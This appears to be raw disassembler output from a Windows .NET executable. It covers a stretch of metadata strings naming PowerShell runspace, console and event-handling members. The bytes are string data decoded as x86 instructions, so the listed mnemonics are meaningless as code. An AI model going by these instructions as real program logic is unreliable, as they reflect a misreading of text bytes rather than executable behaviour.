  408c2c:	69 74 79 49 64 00 50 	imul   $0x72500064,0x49(%ecx,%edi,2),%esi
  408c33:	72 
  408c34:	6f                   	outsl  %ds:(%esi),(%dx)
  408c35:	67 72 65             	addr16 jb 0x408c9d
  408c38:	73 73                	jae    0x408cad
  408c3a:	52                   	push   %edx
  408c3b:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  408c3f:	64 54                	fs push %esp
  408c41:	79 70                	jns    0x408cb3
  408c43:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408c47:	74 5f                	je     0x408ca8
  408c49:	52                   	push   %edx
  408c4a:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  408c4e:	64 54                	fs push %esp
  408c50:	79 70                	jns    0x408cc2
  408c52:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408c56:	6d                   	insl   (%dx),%es:(%edi)
  408c57:	6f                   	outsl  %ds:(%esi),(%dx)
  408c58:	76 65                	jbe    0x408cbf
  408c5a:	00 53 79             	add    %dl,0x79(%ebx)
  408c5d:	73 74                	jae    0x408cd3
  408c5f:	65 6d                	gs insl (%dx),%es:(%edi)
  408c61:	2e 43                	cs inc %ebx
  408c63:	6f                   	outsl  %ds:(%esi),(%dx)
  408c64:	6d                   	insl   (%dx),%es:(%edi)
  408c65:	70 6f                	jo     0x408cd6
  408c67:	6e                   	outsb  %ds:(%esi),(%dx)
  408c68:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c6a:	74 4d                	je     0x408cb9
  408c6c:	6f                   	outsl  %ds:(%esi),(%dx)
  408c6d:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408c70:	00 43 6f             	add    %al,0x6f(%ebx)
  408c73:	6d                   	insl   (%dx),%es:(%edi)
  408c74:	70 6f                	jo     0x408ce5
  408c76:	6e                   	outsb  %ds:(%esi),(%dx)
  408c77:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c79:	74 00                	je     0x408c7b
  408c7b:	52                   	push   %edx
  408c7c:	65 6d                	gs insl (%dx),%es:(%edi)
  408c7e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c7f:	76 65                	jbe    0x408ce6
  408c81:	41                   	inc    %ecx
  408c82:	74 00                	je     0x408c84
  408c84:	53                   	push   %ebx
  408c85:	74 6f                	je     0x408cf6
  408c87:	70 00                	jo     0x408c89
  408c89:	67 65 74 5f          	addr16 gs je 0x408cec
  408c8d:	50                   	push   %eax
  408c8e:	61                   	popa
  408c8f:	72 65                	jb     0x408cf6
  408c91:	6e                   	outsb  %ds:(%esi),(%dx)
  408c92:	74 41                	je     0x408cd5
  408c94:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c98:	69 74 79 49 64 00 49 	imul   $0x6e490064,0x49(%ecx,%edi,2),%esi
  408c9f:	6e 
  408ca0:	73 65                	jae    0x408d07
  408ca2:	72 74                	jb     0x408d18
  408ca4:	00 67 65             	add    %ah,0x65(%edi)
  408ca7:	74 5f                	je     0x408d08
  408ca9:	41                   	inc    %ecx
  408caa:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408cae:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  408cb5:	5f 
  408cb6:	53                   	push   %ebx
  408cb7:	74 61                	je     0x408d1a
  408cb9:	74 75                	je     0x408d30
  408cbb:	73 44                	jae    0x408d01
  408cbd:	65 73 63             	gs jae 0x408d23
  408cc0:	72 69                	jb     0x408d2b
  408cc2:	70 74                	jo     0x408d38
  408cc4:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  408ccb:	5f                   	pop    %edi
  408ccc:	50                   	push   %eax
  408ccd:	65 72 63             	gs jb  0x408d33
  408cd0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd2:	74 43                	je     0x408d17
  408cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd5:	6d                   	insl   (%dx),%es:(%edi)
  408cd6:	70 6c                	jo     0x408d44
  408cd8:	65 74 65             	gs je  0x408d40
  408cdb:	00 67 65             	add    %ah,0x65(%edi)
  408cde:	74 5f                	je     0x408d3f
  408ce0:	53                   	push   %ebx
  408ce1:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408ce5:	64 73 52             	fs jae 0x408d3a
  408ce8:	65 6d                	gs insl (%dx),%es:(%edi)
  408cea:	61                   	popa
  408ceb:	69 6e 69 6e 67 00 54 	imul   $0x5400676e,0x69(%esi),%ebp
  408cf2:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  408cf9:	00 67 65             	add    %ah,0x65(%edi)
  408cfc:	74 5f                	je     0x408d5d
  408cfe:	54                   	push   %esp
  408cff:	6f                   	outsl  %ds:(%esi),(%dx)
  408d00:	74 61                	je     0x408d63
  408d02:	6c                   	insb   (%dx),%es:(%edi)
  408d03:	48                   	dec    %eax
  408d04:	6f                   	outsl  %ds:(%esi),(%dx)
  408d05:	75 72                	jne    0x408d79
  408d07:	73 00                	jae    0x408d09
  408d09:	49                   	dec    %ecx
  408d0a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0b:	74 33                	je     0x408d40
  408d0d:	32 00                	xor    (%eax),%al
  408d0f:	67 65 74 5f          	addr16 gs je 0x408d72
  408d13:	4d                   	dec    %ebp
  408d14:	69 6e 75 74 65 73 00 	imul   $0x736574,0x75(%esi),%ebp
  408d1b:	67 65 74 5f          	addr16 gs je 0x408d7e
  408d1f:	53                   	push   %ebx
  408d20:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408d24:	64 73 00             	fs jae 0x408d27
  408d27:	46                   	inc    %esi
  408d28:	6f                   	outsl  %ds:(%esi),(%dx)
  408d29:	72 6d                	jb     0x408d98
  408d2b:	61                   	popa
  408d2c:	74 00                	je     0x408d2e
  408d2e:	43                   	inc    %ebx
  408d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d30:	6e                   	outsb  %ds:(%esi),(%dx)
  408d31:	63 61 74             	arpl   %esp,0x74(%ecx)
  408d34:	00 67 65             	add    %ah,0x65(%edi)
  408d37:	74 5f                	je     0x408d98
  408d39:	43                   	inc    %ebx
  408d3a:	75 72                	jne    0x408dae
  408d3c:	72 65                	jb     0x408da3
  408d3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408d3f:	74 4f                	je     0x408d90
  408d41:	70 65                	jo     0x408da8
  408d43:	72 61                	jb     0x408da6
  408d45:	74 69                	je     0x408db0
  408d47:	6f                   	outsl  %ds:(%esi),(%dx)
  408d48:	6e                   	outsb  %ds:(%esi),(%dx)
  408d49:	00 41 70             	add    %al,0x70(%ecx)
  408d4c:	70 6c                	jo     0x408dba
  408d4e:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408d55:	00 44 6f 45          	add    %al,0x45(%edi,%ebp,2)
  408d59:	76 65                	jbe    0x408dc0
  408d5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5c:	74 73                	je     0x408dd1
  408d5e:	00 4b 65             	add    %cl,0x65(%ebx)
  408d61:	72 6e                	jb     0x408dd1
  408d63:	65 6c                	gs insb (%dx),%es:(%edi)
  408d65:	33 32                	xor    (%edx),%esi
  408d67:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408d6a:	6c                   	insb   (%dx),%es:(%edi)
  408d6b:	00 4d 65             	add    %cl,0x65(%ebp)
  408d6e:	73 73                	jae    0x408de3
  408d70:	61                   	popa
  408d71:	67 65 42             	addr16 gs inc %edx
  408d74:	6f                   	outsl  %ds:(%esi),(%dx)
  408d75:	78 00                	js     0x408d77
  408d77:	67 65 74 5f          	addr16 gs je 0x408dda
  408d7b:	50                   	push   %eax
  408d7c:	61                   	popa
  408d7d:	72 61                	jb     0x408de0
  408d7f:	6d                   	insl   (%dx),%es:(%edi)
  408d80:	65 74 65             	gs je  0x408de8
  408d83:	72 41                	jb     0x408dc6
  408d85:	73 73                	jae    0x408dfa
  408d87:	65 6d                	gs insl (%dx),%es:(%edi)
  408d89:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408d8d:	75 6c                	jne    0x408dfb
  408d8f:	6c                   	insb   (%dx),%es:(%edi)
  408d90:	4e                   	dec    %esi
  408d91:	61                   	popa
  408d92:	6d                   	insl   (%dx),%es:(%edi)
  408d93:	65 00 54 79 70       	add    %dl,%gs:0x70(%ecx,%edi,2)
  408d98:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408d9c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d9d:	74 69                	je     0x408e08
  408d9f:	6d                   	insl   (%dx),%es:(%edi)
  408da0:	65 54                	gs push %esp
  408da2:	79 70                	jns    0x408e14
  408da4:	65 48                	gs dec %eax
  408da6:	61                   	popa
  408da7:	6e                   	outsb  %ds:(%esi),(%dx)
  408da8:	64 6c                	fs insb (%dx),%es:(%edi)
  408daa:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408dae:	74 54                	je     0x408e04
  408db0:	79 70                	jns    0x408e22
  408db2:	65 46                	gs inc %esi
  408db4:	72 6f                	jb     0x408e25
  408db6:	6d                   	insl   (%dx),%es:(%edi)
  408db7:	48                   	dec    %eax
  408db8:	61                   	popa
  408db9:	6e                   	outsb  %ds:(%esi),(%dx)
  408dba:	64 6c                	fs insb (%dx),%es:(%edi)
  408dbc:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408dc0:	74 54                	je     0x408e16
  408dc2:	79 70                	jns    0x408e34
  408dc4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408dc8:	74 5f                	je     0x408e29
  408dca:	49                   	dec    %ecx
  408dcb:	73 41                	jae    0x408e0e
  408dcd:	72 72                	jb     0x408e41
  408dcf:	61                   	popa
  408dd0:	79 00                	jns    0x408dd2
  408dd2:	47                   	inc    %edi
  408dd3:	65 74 45             	gs je  0x408e1b
  408dd6:	6c                   	insb   (%dx),%es:(%edi)
  408dd7:	65 6d                	gs insl (%dx),%es:(%edi)
  408dd9:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ddb:	74 54                	je     0x408e31
  408ddd:	79 70                	jns    0x408e4f
  408ddf:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408de3:	61                   	popa
  408de4:	72 00                	jb     0x408de6
  408de6:	4d                   	dec    %ebp
  408de7:	61                   	popa
  408de8:	6b 65 47 65          	imul   $0x65,0x47(%ebp),%esp
  408dec:	6e                   	outsb  %ds:(%esi),(%dx)
  408ded:	65 72 69             	gs jb  0x408e59
  408df0:	63 54 79 70          	arpl   %edx,0x70(%ecx,%edi,2)
  408df4:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  408df8:	70 74                	jo     0x408e6e
  408dfa:	79 54                	jns    0x408e50
  408dfc:	79 70                	jns    0x408e6e
  408dfe:	65 73 00             	gs jae 0x408e01
  408e01:	43                   	inc    %ebx
  408e02:	6f                   	outsl  %ds:(%esi),(%dx)
  408e03:	6e                   	outsb  %ds:(%esi),(%dx)
  408e04:	73 74                	jae    0x408e7a
  408e06:	72 75                	jb     0x408e7d
  408e08:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  408e0c:	49                   	dec    %ecx
  408e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  408e0e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408e10:	00 42 69             	add    %al,0x69(%edx)
  408e13:	6e                   	outsb  %ds:(%esi),(%dx)
  408e14:	64 69 6e 67 46 6c 61 	imul   $0x67616c46,%fs:0x67(%esi),%ebp
  408e1b:	67 
  408e1c:	73 00                	jae    0x408e1e
  408e1e:	42                   	inc    %edx
  408e1f:	69 6e 64 65 72 00 50 	imul   $0x50007265,0x64(%esi),%ebp
  408e26:	61                   	popa
  408e27:	72 61                	jb     0x408e8a
  408e29:	6d                   	insl   (%dx),%es:(%edi)
  408e2a:	65 74 65             	gs je  0x408e92
  408e2d:	72 4d                	jb     0x408e7c
  408e2f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e30:	64 69 66 69 65 72 00 	imul   $0x47007265,%fs:0x69(%esi),%esp
  408e37:	47 
  408e38:	65 74 43             	gs je  0x408e7e
  408e3b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e3c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e3d:	73 74                	jae    0x408eb3
  408e3f:	72 75                	jb     0x408eb6
  408e41:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  408e45:	00 49 6e             	add    %cl,0x6e(%ecx)
  408e48:	76 6f                	jbe    0x408eb9
  408e4a:	6b 65 00 43          	imul   $0x43,0x0(%ebp),%esp
  408e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  408e4f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e50:	76 65                	jbe    0x408eb7
  408e52:	72 74                	jb     0x408ec8
  408e54:	00 43 68             	add    %al,0x68(%ebx)
  408e57:	61                   	popa
  408e58:	6e                   	outsb  %ds:(%esi),(%dx)
  408e59:	67 65 54             	addr16 gs push %esp
  408e5c:	79 70                	jns    0x408ece
  408e5e:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  408e62:	76 6f                	jbe    0x408ed3
  408e64:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408e68:	6d                   	insl   (%dx),%es:(%edi)
  408e69:	62 65 72             	bound  %esp,0x72(%ebp)
  408e6c:	00 41 72             	add    %al,0x72(%ecx)
  408e6f:	72 61                	jb     0x408ed2
  408e71:	79 00                	jns    0x408e73
  408e73:	6f                   	outsl  %ds:(%esi),(%dx)
  408e74:	70 5f                	jo     0x408ed5
  408e76:	49                   	dec    %ecx
  408e77:	6e                   	outsb  %ds:(%esi),(%dx)
  408e78:	65 71 75             	gs jno 0x408ef0
  408e7b:	61                   	popa
  408e7c:	6c                   	insb   (%dx),%es:(%edi)
  408e7d:	69 74 79 00 6f 70 5f 	imul   $0x455f706f,0x0(%ecx,%edi,2),%esi
  408e84:	45 
  408e85:	71 75                	jno    0x408efc
  408e87:	61                   	popa
  408e88:	6c                   	insb   (%dx),%es:(%edi)
  408e89:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  408e90:	5f 
  408e91:	44                   	inc    %esp
  408e92:	65 66 61             	gs popaw
  408e95:	75 6c                	jne    0x408f03
  408e97:	74 56                	je     0x408eef
  408e99:	61                   	popa
  408e9a:	6c                   	insb   (%dx),%es:(%edi)
  408e9b:	75 65                	jne    0x408f02
  408e9d:	00 45 78             	add    %al,0x78(%ebp)
  408ea0:	63 65 70             	arpl   %esp,0x70(%ebp)
  408ea3:	74 69                	je     0x408f0e
  408ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  408ea6:	6e                   	outsb  %ds:(%esi),(%dx)
  408ea7:	00 54 6f 43          	add    %dl,0x43(%edi,%ebp,2)
  408eab:	68 61 72 41 72       	push   $0x72417261
  408eb0:	72 61                	jb     0x408f13
  408eb2:	79 00                	jns    0x408eb4
  408eb4:	41                   	inc    %ecx
  408eb5:	70 70                	jo     0x408f27
  408eb7:	65 6e                	outsb  %gs:(%esi),(%dx)
  408eb9:	64 43                	fs inc %ebx
  408ebb:	68 61 72 00 43       	push   $0x43007261
  408ec0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ec2:	73 6f                	jae    0x408f33
  408ec4:	6c                   	insb   (%dx),%es:(%edi)
  408ec5:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  408eca:	73 6f                	jae    0x408f3b
  408ecc:	6c                   	insb   (%dx),%es:(%edi)
  408ecd:	65 4b                	gs dec %ebx
  408ecf:	65 79 49             	gs jns 0x408f1b
  408ed2:	6e                   	outsb  %ds:(%esi),(%dx)
  408ed3:	66 6f                	outsw  %ds:(%esi),(%dx)
  408ed5:	00 43 6f             	add    %al,0x6f(%ebx)
  408ed8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ed9:	73 6f                	jae    0x408f4a
  408edb:	6c                   	insb   (%dx),%es:(%edi)
  408edc:	65 4b                	gs dec %ebx
  408ede:	65 79 00             	gs jns 0x408ee1
  408ee1:	67 65 74 5f          	addr16 gs je 0x408f44
  408ee5:	4b                   	dec    %ebx
  408ee6:	65 79 00             	gs jns 0x408ee9
  408ee9:	67 65 74 5f          	addr16 gs je 0x408f4c
  408eed:	4c                   	dec    %esp
  408eee:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef0:	67 74 68             	addr16 je 0x408f5b
  408ef3:	00 67 65             	add    %ah,0x65(%edi)
  408ef6:	74 5f                	je     0x408f57
  408ef8:	4b                   	dec    %ebx
  408ef9:	65 79 43             	gs jns 0x408f3f
  408efc:	68 61 72 00 53       	push   $0x53007261
  408f01:	79 73                	jns    0x408f76
  408f03:	74 65                	je     0x408f6a
  408f05:	6d                   	insl   (%dx),%es:(%edi)
  408f06:	2e 54                	cs push %esp
  408f08:	68 72 65 61 64       	push   $0x64616572
  408f0d:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  408f14:	65 61                	gs popa
  408f16:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408f1a:	74 5f                	je     0x408f7b
  408f1c:	43                   	inc    %ebx
  408f1d:	75 72                	jne    0x408f91
  408f1f:	72 65                	jb     0x408f86
  408f21:	6e                   	outsb  %ds:(%esi),(%dx)
  408f22:	74 54                	je     0x408f78
  408f24:	68 72 65 61 64       	push   $0x64616572
  408f29:	00 4e 65             	add    %cl,0x65(%esi)
  408f2c:	77 47                	ja     0x408f75
  408f2e:	75 69                	jne    0x408f99
  408f30:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408f34:	50                   	push   %eax
  408f35:	53                   	push   %ebx
  408f36:	4f                   	dec    %edi
  408f37:	62 6a 65             	bound  %ebp,0x65(%edx)
  408f3a:	63 74 00 41          	arpl   %esi,0x41(%eax,%eax,1)
  408f3e:	72 67                	jb     0x408fa7
  408f40:	75 6d                	jne    0x408faf
  408f42:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f44:	74 4e                	je     0x408f94
  408f46:	75 6c                	jne    0x408fb4
  408f48:	6c                   	insb   (%dx),%es:(%edi)
  408f49:	45                   	inc    %ebp
  408f4a:	78 63                	js     0x408faf
  408f4c:	65 70 74             	gs jo  0x408fc3
  408f4f:	69 6f 6e 00 53 54 41 	imul   $0x41545300,0x6e(%edi),%ebp
  408f56:	54                   	push   %esp
  408f57:	68 72 65 61 64       	push   $0x64616572
  408f5c:	41                   	inc    %ecx
  408f5d:	74 74                	je     0x408fd3
  408f5f:	72 69                	jb     0x408fca
  408f61:	62 75 74             	bound  %esi,0x74(%ebp)
  408f64:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  408f68:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  408f6b:	44                   	inc    %esp
  408f6c:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  408f73:	6c                   	insb   (%dx),%es:(%edi)
  408f74:	61                   	popa
  408f75:	73 73                	jae    0x408fea
  408f77:	36 00 4d 61          	add    %cl,%ss:0x61(%ebp)
  408f7b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f7c:	75 61                	jne    0x408fdf
  408f7e:	6c                   	insb   (%dx),%es:(%edi)
  408f7f:	52                   	push   %edx
  408f80:	65 73 65             	gs jae 0x408fe8
  408f83:	74 45                	je     0x408fca
  408f85:	76 65                	jbe    0x408fec
  408f87:	6e                   	outsb  %ds:(%esi),(%dx)
  408f88:	74 00                	je     0x408f8a
  408f8a:	6d                   	insl   (%dx),%es:(%edi)
  408f8b:	72 65                	jb     0x408ff2
  408f8d:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  408f91:	61                   	popa
  408f92:	41                   	inc    %ecx
  408f93:	64 64 65 64 45       	fs fs gs fs inc %ebp
  408f98:	76 65                	jbe    0x408fff
  408f9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408f9b:	74 41                	je     0x408fde
  408f9d:	72 67                	jb     0x409006
  408f9f:	73 00                	jae    0x408fa1
  408fa1:	3c 4d                	cmp    $0x4d,%al
  408fa3:	61                   	popa
  408fa4:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  408fab:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  408fb2:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  408fb5:	31 00                	xor    %eax,(%eax)
  408fb7:	49                   	dec    %ecx
  408fb8:	41                   	inc    %ecx
  408fb9:	73 79                	jae    0x409034
  408fbb:	6e                   	outsb  %ds:(%esi),(%dx)
  408fbc:	63 52 65             	arpl   %edx,0x65(%edx)
  408fbf:	73 75                	jae    0x409036
  408fc1:	6c                   	insb   (%dx),%es:(%edi)
  408fc2:	74 00                	je     0x408fc4
  408fc4:	3c 4d                	cmp    $0x4d,%al
  408fc6:	61                   	popa
  408fc7:	69 6e 3e 62 5f 5f 32 	imul   $0x325f5f62,0x3e(%esi),%ebp
  408fce:	00 61 72             	add    %ah,0x72(%ecx)
  408fd1:	00 50 53             	add    %dl,0x53(%eax)
  408fd4:	44                   	inc    %esp
  408fd5:	61                   	popa
  408fd6:	74 61                	je     0x409039
  408fd8:	43                   	inc    %ebx
  408fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fda:	6c                   	insb   (%dx),%es:(%edi)
  408fdb:	6c                   	insb   (%dx),%es:(%edi)
  408fdc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe2:	60                   	pusha
  408fe3:	31 00                	xor    %eax,(%eax)
  408fe5:	45                   	inc    %ebp
  408fe6:	72 72                	jb     0x40905a
  408fe8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe9:	72 52                	jb     0x40903d
  408feb:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  408fef:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408ff3:	74 5f                	je     0x409054
  408ff5:	49                   	dec    %ecx
  408ff6:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff7:	64 65 78 00          	fs gs js 0x408ffb
  408ffb:	67 65 74 5f          	addr16 gs je 0x40905e
  408fff:	45                   	inc    %ebp
  409000:	78 63                	js     0x409065
  409002:	65 70 74             	gs jo  0x409079
  409005:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40900c:	5f                   	pop    %edi
  40900d:	4d                   	dec    %ebp
  40900e:	65 73 73             	gs jae 0x409084
  409011:	61                   	popa
  409012:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  409017:	74 5f                	je     0x409078
  409019:	49                   	dec    %ecx
  40901a:	73 43                	jae    0x40905f
  40901c:	6f                   	outsl  %ds:(%esi),(%dx)
  40901d:	6d                   	insl   (%dx),%es:(%edi)
  40901e:	70 6c                	jo     0x40908c
  409020:	65 74 65             	gs je  0x409088
  409023:	64 00 45 76          	add    %al,%fs:0x76(%ebp)
  409027:	65 6e                	outsb  %gs:(%esi),(%dx)
  409029:	74 57                	je     0x409082
  40902b:	61                   	popa
  40902c:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  409033:	65 
  409034:	00 53 65             	add    %dl,0x65(%ebx)
  409037:	74 00                	je     0x409039
  409039:	45                   	inc    %ebp
  40903a:	6e                   	outsb  %ds:(%esi),(%dx)
  40903b:	61                   	popa
  40903c:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  409040:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  409047:	79 6c                	jns    0x4090b5
  409049:	65 73 00             	gs jae 0x40904c
  40904c:	55                   	push   %ebp
  40904d:	6e                   	outsb  %ds:(%esi),(%dx)
  40904e:	68 61 6e 64 6c       	push   $0x6c646e61
  409053:	65 64 45             	gs fs inc %ebp
  409056:	78 63                	js     0x4090bb
  409058:	65 70 74             	gs jo  0x4090cf
  40905b:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  409062:	74 48                	je     0x4090ac
  409064:	61                   	popa
  409065:	6e                   	outsb  %ds:(%esi),(%dx)
  409066:	64 6c                	fs insb (%dx),%es:(%edi)
  409068:	65 72 00             	gs jb  0x40906b
  40906b:	61                   	popa
  40906c:	64 64 5f             	fs fs pop %edi
  40906f:	55                   	push   %ebp
  409070:	6e                   	outsb  %ds:(%esi),(%dx)
  409071:	68 61 6e 64 6c       	push   $0x6c646e61
  409076:	65 64 45             	gs fs inc %ebp
  409079:	78 63                	js     0x4090de
  40907b:	65 70 74             	gs jo  0x4090f2
  40907e:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  409085:	74 65                	je     0x4090ec
  409087:	6d                   	insl   (%dx),%es:(%edi)
  409088:	2e 4d                	cs dec %ebp
  40908a:	61                   	popa
  40908b:	6e                   	outsb  %ds:(%esi),(%dx)
  40908c:	61                   	popa
  40908d:	67 65 6d             	gs insl (%dx),%es:(%di)
  409090:	65 6e                	outsb  %gs:(%esi),(%dx)
  409092:	74 2e                	je     0x4090c2
  409094:	41                   	inc    %ecx
  409095:	75 74                	jne    0x40910b
  409097:	6f                   	outsl  %ds:(%esi),(%dx)
  409098:	6d                   	insl   (%dx),%es:(%edi)
  409099:	61                   	popa
  40909a:	74 69                	je     0x409105
  40909c:	6f                   	outsl  %ds:(%esi),(%dx)
  40909d:	6e                   	outsb  %ds:(%esi),(%dx)
  40909e:	2e 52                	cs push %edx
  4090a0:	75 6e                	jne    0x409110
  4090a2:	73 70                	jae    0x409114
  4090a4:	61                   	popa
  4090a5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4090a8:	00 52 75             	add    %dl,0x75(%edx)
  4090ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ac:	73 70                	jae    0x40911e
  4090ae:	61                   	popa
  4090af:	63 65 46             	arpl   %esp,0x46(%ebp)
  4090b2:	61                   	popa
  4090b3:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4090b7:	79 00                	jns    0x4090b9
  4090b9:	52                   	push   %edx
  4090ba:	75 6e                	jne    0x40912a
  4090bc:	73 70                	jae    0x40912e
  4090be:	61                   	popa
  4090bf:	63 65 00             	arpl   %esp,0x0(%ebp)
  4090c2:	43                   	inc    %ebx
  4090c3:	72 65                	jb     0x40912a
  4090c5:	61                   	popa
  4090c6:	74 65                	je     0x40912d
  4090c8:	52                   	push   %edx
  4090c9:	75 6e                	jne    0x409139
  4090cb:	73 70                	jae    0x40913d
  4090cd:	61                   	popa
  4090ce:	63 65 00             	arpl   %esp,0x0(%ebp)
  4090d1:	41                   	inc    %ecx
  4090d2:	70 61                	jo     0x409135
  4090d4:	72 74                	jb     0x40914a
  4090d6:	6d                   	insl   (%dx),%es:(%edi)
  4090d7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090d9:	74 53                	je     0x40912e
  4090db:	74 61                	je     0x40913e
  4090dd:	74 65                	je     0x409144
  4090df:	00 73 65             	add    %dh,0x65(%ebx)
  4090e2:	74 5f                	je     0x409143
  4090e4:	41                   	inc    %ecx
  4090e5:	70 61                	jo     0x409148
  4090e7:	72 74                	jb     0x40915d
  4090e9:	6d                   	insl   (%dx),%es:(%edi)
  4090ea:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090ec:	74 53                	je     0x409141
  4090ee:	74 61                	je     0x409151
  4090f0:	74 65                	je     0x409157
  4090f2:	00 4f 70             	add    %cl,0x70(%edi)
  4090f5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090f7:	00 50 6f             	add    %dl,0x6f(%eax)
  4090fa:	77 65                	ja     0x409161
  4090fc:	72 53                	jb     0x409151
  4090fe:	68 65 6c 6c 00       	push   $0x6c6c65
  409103:	43                   	inc    %ebx
  409104:	72 65                	jb     0x40916b
  409106:	61                   	popa
  409107:	74 65                	je     0x40916e
  409109:	00 73 65             	add    %dh,0x65(%ebx)
  40910c:	74 5f                	je     0x40916d
  40910e:	52                   	push   %edx
  40910f:	75 6e                	jne    0x40917f
  409111:	73 70                	jae    0x409183
  409113:	61                   	popa
  409114:	63 65 00             	arpl   %esp,0x0(%ebp)
  409117:	50                   	push   %eax
  409118:	53                   	push   %ebx
  409119:	44                   	inc    %esp
  40911a:	61                   	popa
  40911b:	74 61                	je     0x40917e
  40911d:	53                   	push   %ebx
  40911e:	74 72                	je     0x409192
  409120:	65 61                	gs popa
  409122:	6d                   	insl   (%dx),%es:(%edi)
  409123:	73 00                	jae    0x409125
  409125:	67 65 74 5f          	addr16 gs je 0x409188
  409129:	53                   	push   %ebx
  40912a:	74 72                	je     0x40919e
  40912c:	65 61                	gs popa
  40912e:	6d                   	insl   (%dx),%es:(%edi)
  40912f:	73 00                	jae    0x409131
  409131:	67 65 74 5f          	addr16 gs je 0x409194
  409135:	45                   	inc    %ebp
  409136:	72 72                	jb     0x4091aa
  409138:	6f                   	outsl  %ds:(%esi),(%dx)
  409139:	72 00                	jb     0x40913b
  40913b:	45                   	inc    %ebp
  40913c:	76 65                	jbe    0x4091a3
  40913e:	6e                   	outsb  %ds:(%esi),(%dx)
  40913f:	74 48                	je     0x409189
  409141:	61                   	popa
  409142:	6e                   	outsb  %ds:(%esi),(%dx)
  409143:	64 6c                	fs insb (%dx),%es:(%edi)
  409145:	65 72 60             	gs jb  0x4091a8
